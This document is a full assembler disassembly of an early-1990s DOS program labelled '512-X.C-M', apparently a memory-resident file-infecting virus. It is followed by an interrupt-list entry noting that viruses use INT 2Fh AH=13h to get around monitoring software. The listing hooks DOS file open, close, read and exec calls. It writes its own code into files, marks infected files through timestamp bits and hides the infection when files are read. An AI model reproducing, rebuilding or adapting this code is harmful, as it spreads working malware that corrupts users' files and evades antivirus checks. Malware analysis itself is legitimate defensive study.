;NAME:          512-X.C-M
;FILE SIZE:     00200h - 512d
;START (CS:IP): 00100h
;CODE END:      00300h
;CODE ORIGIN:   00100h
;DATE:          Wed Aug 05 13:56:29 1992

CODE    SEGMENT BYTE PUBLIC 'CODE'
ASSUME  CS:CODE,DS:CODE,ES:NOTHING,SS:NOTHING

P00100  PROC
        ORG     0100h

H00100: MOV	AH,30h				    ;00100 B430 	 _0
	INT	21h		;2-DOS_Ver	    ;00102 CD21 	 _!
	MOV	SI,0004h			    ;00104 BE0400	 ___
	MOV	DS,SI		;DS_Chg 	    ;00107 8EDE 	 __
	CMP	AH,1Eh				    ;00109 80FC1E	 ___
	LDS	AX,[SI+08h]			    ;0010C C54408	 _D_
	JB	H0011B				    ;0010F 720A 	 r_
        MOV     AH,13h                              ;00111 B413          __
	INT	2Fh		;3-Prt_Splr_Ctrl    ;00113 CD2F 	 _/
	PUSH	DS				    ;00115 1E		 _
	PUSH	DX				    ;00116 52		 R
	INT	2Fh		;3-Prt_Splr_Ctrl    ;00117 CD2F 	 _/
	POP	AX				    ;00119 58		 X
	POP	DS				    ;0011A 1F		 _
H0011B: MOV	DI,00F8h			    ;0011B BFF800	 ___
	STOSW					    ;0011E AB		 _
	MOV	AX,DS				    ;0011F 8CD8 	 __
	STOSW					    ;00121 AB		 _
	MOV	DS,SI		;DS_Chg 	    ;00122 8EDE 	 __
	LDS	AX,[SI+40h]			    ;00124 C54440	 _D@
	STOSW					    ;00127 AB		 _
	CMP	AX,0121h			    ;00128 3D2101	 =!_
	MOV	AX,DS				    ;0012B 8CD8 	 __
	STOSW					    ;0012D AB		 _
	PUSH	ES				    ;0012E 06		 _
	PUSH	DI				    ;0012F 57		 W
	JNZ	H00139				    ;00130 7507 	 u_
	SHL	SI,1				    ;00132 D1E6 	 __
	MOV	CX,0100h			    ;00134 B90001	 ___
	REPZ	CMPSW				    ;00137 F3A7 	 __
H00139: PUSH	CS				    ;00139 0E		 _
	POP	DS				    ;0013A 1F		 _
	JZ	H00187				    ;0013B 744A 	 tJ
	MOV	AH,52h				    ;0013D B452 	 _R
	INT	21h		;2-Rsvd_INT:21h-52h ;0013F CD21 	 _!
	PUSH	ES				    ;00141 06		 _
	MOV	SI,00F8h			    ;00142 BEF800	 ___
	SUB	DI,DI				    ;00145 2BFF 	 +_
	LES	AX,ES:[BX+12h]	;ES_Ovrd	    ;00147 26C44712	 &_G_
	MOV	DX,ES:[DI+02h]	;ES_Ovrd	    ;0014B 268B5502	 &_U_
	MOV	CX,0104h			    ;0014F B90401	 ___
	REPZ	MOVSW				    ;00152 F3A5 	 __
	MOV	DS,CX		;DS_Chg 	    ;00154 8ED9 	 __
	MOV	DI,0016h			    ;00156 BF1600	 ___
	MOV	Word Ptr [DI+6Eh],0121h 	    ;00159 C7456E2101	 _En!_
	MOV	[DI+70h],ES			    ;0015E 8C4570	 _Ep
	POP	DS				    ;00161 1F		 _
	MOV	[BX+14h],DX			    ;00162 895714	 _W_
	MOV	DX,CS				    ;00165 8CCA 	 __
	MOV	DS,DX		;DS_Chg 	    ;00167 8EDA 	 __
	MOV	BX,[DI-14h]			    ;00169 8B5DEC	 _]_
	DEC	BH				    ;0016C FECF 	 __
	MOV	ES,BX		;ES_Chg 	    ;0016E 8EC3 	 __
	CMP	DX,[DI] 			    ;00170 3B15 	 ;_
	MOV	DS,[DI] 	;DS_Chg 	    ;00172 8E1D 	 __
	MOV	DX,[DI] 			    ;00174 8B15 	 __
	DEC	DX				    ;00176 4A		 J
	MOV	DS,DX		;DS_Chg 	    ;00177 8EDA 	 __
	MOV	SI,CX				    ;00179 8BF1 	 __
	MOV	DX,DI				    ;0017B 8BD7 	 __
	MOV	CL,28h				    ;0017D B128 	 _(
	REPZ	MOVSW				    ;0017F F3A5 	 __
	MOV	DS,BX		;DS_Chg 	    ;00181 8EDB 	 __
	JB	H00197				    ;00183 7212 	 r_
	INT	20h		;B-TERM_norm:20h    ;00185 CD20 	 _ 
;---------------------------------------------------
H00187: MOV	SI,CX				    ;00187 8BF1 	 __
	MOV	DS,[SI+2Ch]	;DS_Chg 	    ;00189 8E5C2C	 _\,
	LODSW					    ;0018C AD		 _
	DEC	SI				    ;0018D 4E		 N
	TEST	AX,AX				    ;0018E 85C0 	 __
	JNZ	H0018C				    ;00190 75FA 	 u_
	ADD	SI,+03h 			    ;00192 83C603	 ___
	MOV	DX,SI				    ;00195 8BD6 	 __
H00197: MOV	AH,3Dh				    ;00197 B43D 	 _=
	CALL	H001B0		; . . . . . . . . . ;00199 E81400	 ___
	MOV	DX,[DI] 			    ;0019C 8B15 	 __
	MOV	[DI+04h],DX			    ;0019E 895504	 _U_
	ADD	[DI],CX 			    ;001A1 010D 	 __
	POP	DX				    ;001A3 5A		 Z
	PUSH	DX				    ;001A4 52		 R
	PUSH	CS				    ;001A5 0E		 _
	POP	ES				    ;001A6 07		 _
	PUSH	CS				    ;001A7 0E		 _
	POP	DS				    ;001A8 1F		 _
	PUSH	DS				    ;001A9 1E		 _
	MOV	AL,50h				    ;001AA B050 	 _P
	PUSH	AX				    ;001AC 50		 P
	MOV	AH,3Fh				    ;001AD B43F 	 _?
	RET			;RET_Far	    ;001AF CB		 _
;---------------------------------------------------
H001B0: INT	21h		;Indef_INT:21h-AH   ;001B0 CD21 	 _!
	JB	H001CD				    ;001B2 7219 	 r_
	MOV	BX,AX				    ;001B4 8BD8 	 __
	PUSH	BX				    ;001B6 53		 S
	MOV	AX,1220h			    ;001B7 B82012	 _ _
	INT	2Fh		;3-Prt_Splr_Ctrl    ;001BA CD2F 	 _/
	MOV	BL,ES:[DI]	;ES_Ovrd	    ;001BC 268A1D	 &__
	MOV	AX,1216h			    ;001BF B81612	 ___
	INT	2Fh		;3-Prt_Splr_Ctrl    ;001C2 CD2F 	 _/
	POP	BX				    ;001C4 5B		 [
	PUSH	ES				    ;001C5 06		 _
	POP	DS				    ;001C6 1F		 _
	ADD	DI,+11h 			    ;001C7 83C711	 ___
	MOV	CX,0200h			    ;001CA B90002	 ___
H001CD: RET			;RET_Near	    ;001CD C3		 _
;---------------------------------------------------
	STI					    ;001CE FB		 _
	PUSH	ES				    ;001CF 06		 _
	PUSH	SI				    ;001D0 56		 V
	PUSH	DI				    ;001D1 57		 W
	PUSH	BP				    ;001D2 55		 U
	PUSH	DS				    ;001D3 1E		 _
	PUSH	CX				    ;001D4 51		 Q
	CALL	H001B6		; . . . . . . . . . ;001D5 E8DEFF	 ___
	MOV	BP,CX				    ;001D8 8BE9 	 __
	MOV	SI,[DI+04h]			    ;001DA 8B7504	 _u_
	POP	CX				    ;001DD 59		 Y
	POP	DS				    ;001DE 1F		 _
	CALL	H00211		; . . . . . . . . . ;001DF E82F00	 _/_
	JB	H0020A				    ;001E2 7226 	 r&
	CMP	SI,BP				    ;001E4 3BF5 	 ;_
	JNB	H0020A				    ;001E6 7322 	 s"
	PUSH	AX				    ;001E8 50		 P
	MOV	AL,ES:[DI-04h]	;ES_Ovrd	    ;001E9 268A45FC	 &_E_
	NOT	AL				    ;001ED F6D0 	 __
	AND	AL,1Fh				    ;001EF 241F 	 $_
	JNZ	H00209				    ;001F1 7516 	 u_
	ADD	SI,ES:[DI]	;ES_Ovrd	    ;001F3 260335	 &_5
	XCHG	SI,ES:[DI+04h]	;ES_Ovrd	    ;001F6 26877504	 &_u_
	ADD	ES:[DI],BP	;ES_Ovrd	    ;001FA 26012D	 &_-
	CALL	H00211		; . . . . . . . . . ;001FD E81100	 ___
	MOV	ES:[DI+04h],SI	;ES_Ovrd	    ;00200 26897504	 &_u_
	LAHF					    ;00204 9F		 _
	SUB	ES:[DI],BP	;ES_Ovrd	    ;00205 26292D	 &)-
	SAHF					    ;00208 9E		 _
H00209: POP	AX				    ;00209 58		 X
H0020A: POP	BP				    ;0020A 5D		 ]
	POP	DI				    ;0020B 5F		 _
	POP	SI				    ;0020C 5E		 ^
	POP	ES				    ;0020D 07		 _
	RET	0002h		;RET_Far:0002h	    ;0020E CA0200	 ___
;---------------------------------------------------
H00211: MOV	AH,3Fh				    ;00211 B43F 	 _?
	PUSHF					    ;00213 9C		 _
	PUSH	CS				    ;00214 0E		 _
	CALL	H0023A		; . . . . . . . . . ;00215 E82200	 _"_
	RET			;RET_Near	    ;00218 C3		 _
;---------------------------------------------------
	CMP	AH,3Fh				    ;00219 80FC3F	 __?
	JZ	H001CE				    ;0021C 74B0 	 t_
	PUSH	DS				    ;0021E 1E		 _
	PUSH	ES				    ;0021F 06		 _
	PUSH	AX				    ;00220 50		 P
	PUSH	BX				    ;00221 53		 S
	PUSH	CX				    ;00222 51		 Q
	PUSH	DX				    ;00223 52		 R
	PUSH	SI				    ;00224 56		 V
	PUSH	DI				    ;00225 57		 W
	CMP	AH,3Eh				    ;00226 80FC3E	 __>
	JZ	H0023F				    ;00229 7414 	 t_
	CMP	AX,4B00h			    ;0022B 3D004B	 =_K
	MOV	AH,3Dh				    ;0022E B43D 	 _=
	JZ	H00241				    ;00230 740F 	 t_
	POP	DI				    ;00232 5F		 _
	POP	SI				    ;00233 5E		 ^
	POP	DX				    ;00234 5A		 Z
	POP	CX				    ;00235 59		 Y
	POP	BX				    ;00236 5B		 [
	POP	AX				    ;00237 58		 X
	POP	ES				    ;00238 07		 _
	POP	DS				    ;00239 1F		 _
H0023A: JMP	Word Ptr CS:[0004h]
				;Mem_Brch:CS:[0004h];0023A 2EFF2E0400	 ._.__
;---------------------------------------------------
H0023F: MOV	AH,45h				    ;0023F B445 	 _E
H00241: CALL	H001B0		; . . . . . . . . . ;00241 E86CFF	 _l_
	JB	H00232				    ;00244 72EC 	 r_
	SUB	AX,AX				    ;00246 2BC0 	 +_
	MOV	[DI+04h],AX			    ;00248 894504	 _E_
	MOV	Byte Ptr [DI-0Fh],02h		    ;0024B C645F102	 _E__
	CLD					    ;0024F FC		 _
	MOV	DS,AX		;DS_Chg 	    ;00250 8ED8 	 __
	MOV	SI,004Ch			    ;00252 BE4C00	 _L_
	LODSW					    ;00255 AD		 _
	PUSH	AX				    ;00256 50		 P
	LODSW					    ;00257 AD		 _
	PUSH	AX				    ;00258 50		 P
	PUSH	[SI+40h]			    ;00259 FF7440	 _t@
	PUSH	[SI+42h]			    ;0025C FF7442	 _tB
	LDS	DX,CS:[SI-50h]	;CS_Ovrd	    ;0025F 2EC554B0	 ._T_
	MOV	AX,2513h			    ;00263 B81325	 __%
	INT	21h		;1-Set_Int_Vctr     ;00266 CD21 	 _!
	PUSH	CS				    ;00268 0E		 _
	POP	DS				    ;00269 1F		 _
	MOV	DX,0204h			    ;0026A BA0402	 ___
	MOV	AL,24h				    ;0026D B024 	 _$
	INT	21h		;Indef_INT:21h-25h  ;0026F CD21 	 _!
	PUSH	ES				    ;00271 06		 _
	POP	DS				    ;00272 1F		 _
	MOV	AL,[DI-04h]			    ;00273 8A45FC	 _E_
	AND	AL,1Fh				    ;00276 241F 	 $_
	CMP	AL,1Fh				    ;00278 3C1F 	 <_
	JZ	H00284				    ;0027A 7408 	 t_
	MOV	AX,[DI+17h]			    ;0027C 8B4517	 _E_
	SUB	AX,4F43h			    ;0027F 2D434F	 -CO
	JNZ	H002C3				    ;00282 753F 	 u?
H00284: XOR	[DI-04h],AL			    ;00284 3045FC	 0E_
	MOV	AX,[DI] 			    ;00287 8B05 	 __
	CMP	AX,CX				    ;00289 3BC1 	 ;_
;---------------------------------------------------
	DB	"r6"				    ;0028B 7236
;---------------------------------------------------
	ADD	AX,CX				    ;0028D 03C1 	 __
	JB	H002C3				    ;0028F 7232 	 r2
	TEST	Byte Ptr [DI-0Dh],04h		    ;00291 F645F304	 _E__
	JNZ	H002C3				    ;00295 752C 	 u,
	LDS	SI,[DI-0Ah]			    ;00297 C575F6	 _u_
	DEC	AX				    ;0029A 48		 H
	SHR	AH,1				    ;0029B D0EC 	 __
	AND	AH,[SI+04h]			    ;0029D 226404	 "d_
	JZ	H002C3				    ;002A0 7421 	 t!
	MOV	AX,0020h			    ;002A2 B82000	 _ _
	MOV	DS,AX		;DS_Chg 	    ;002A5 8ED8 	 __
	SUB	DX,DX				    ;002A7 2BD2 	 +_
	CALL	H00211		; . . . . . . . . . ;002A9 E865FF	 _e_
	MOV	SI,DX				    ;002AC 8BF2 	 __
	PUSH	CX				    ;002AE 51		 Q
	LODSB					    ;002AF AC		 _
	CMP	AL,CS:[SI+07h]	;CS_Ovrd	    ;002B0 2E3A4407	 .:D_
	JNZ	H002DD				    ;002B4 7527 	 u'
	LOOP	H002AF				    ;002B6 E2F7 	 __
	POP	CX				    ;002B8 59		 Y
	OR	Byte Ptr ES:[DI-04h],1Fh
				;ES_Ovrd	    ;002B9 26804DFC1F	 &_M__
	OR	Byte Ptr ES:[DI-0Bh],40h
				;ES_Ovrd	    ;002BE 26804DF540	 &_M_@
H002C3: MOV	AH,3Eh				    ;002C3 B43E 	 _>
	CALL	H00213		; . . . . . . . . . ;002C5 E84BFF	 _K_
	OR	Byte Ptr ES:[DI-0Ch],40h
				;ES_Ovrd	    ;002C8 26804DF440	 &_M_@
	POP	DS				    ;002CD 1F		 _
	POP	DX				    ;002CE 5A		 Z
	MOV	AX,2524h			    ;002CF B82425	 _$%
	INT	21h		;1-Set_Int_Vctr     ;002D2 CD21 	 _!
	POP	DS				    ;002D4 1F		 _
	POP	DX				    ;002D5 5A		 Z
	MOV	AL,13h				    ;002D6 B013 	 __
	INT	21h		;Indef_INT:21h-25h  ;002D8 CD21 	 _!
	JMP	H00232				    ;002DA E955FF	 _U_
;---------------------------------------------------
H002DD: POP	CX				    ;002DD 59		 Y
	MOV	SI,ES:[DI]	;ES_Ovrd	    ;002DE 268B35	 &_5
	MOV	ES:[DI+04h],SI	;ES_Ovrd	    ;002E1 26897504	 &_u_
	MOV	AH,40h				    ;002E5 B440 	 _@
	INT	21h		;2-Wr_Fl_Hdl	    ;002E7 CD21 	 _!
	JB	H002BE				    ;002E9 72D3 	 r_
	MOV	ES:[DI],SI	;ES_Ovrd	    ;002EB 268935	 &_5
	MOV	ES:[DI+04h],DX	;ES_Ovrd	    ;002EE 26895504	 &_U_
	PUSH	CS				    ;002F2 0E		 _
	POP	DS				    ;002F3 1F		 _
	MOV	DL,08h				    ;002F4 B208 	 __
	MOV	AH,40h				    ;002F6 B440 	 _@
	INT	21h		;2-Wr_Fl_Hdl	    ;002F8 CD21 	 _!
	JMP	Short H002B9			    ;002FA EBBD 	 __
;---------------------------------------------------
	IRET					    ;002FC CF		 _
;---------------------------------------------------
        DB      "666"                               ;002FD 363636
;---------------------------------------------------

                        
P00100  ENDP

CODE    ENDS
        END     H00100
 
;-------------------------------------------------------------------------------

INT 2F - Multiplex - DOS 3.3+ - SET DISK INTERRUPT HANDLER
        AH = 13h
        DS:DX -> interrupt handler disk driver calls on read/write
        ES:BX = address to restore INT 13 to on system halt (exit from root
                 shell)
Return: DS:DX from previous invocation of this function
        ES:BX from previous invocation of this function
Notes:  most DOS 3.3+ disk access is via the vector in DS:DX, although a few
          functions are still invoked via an INT 13 instruction
        this is a dangerous security loophole for any virus-monitoring software
          which does not trap this call (at least two viruses are known to use
          it to get the original ROM entry point)
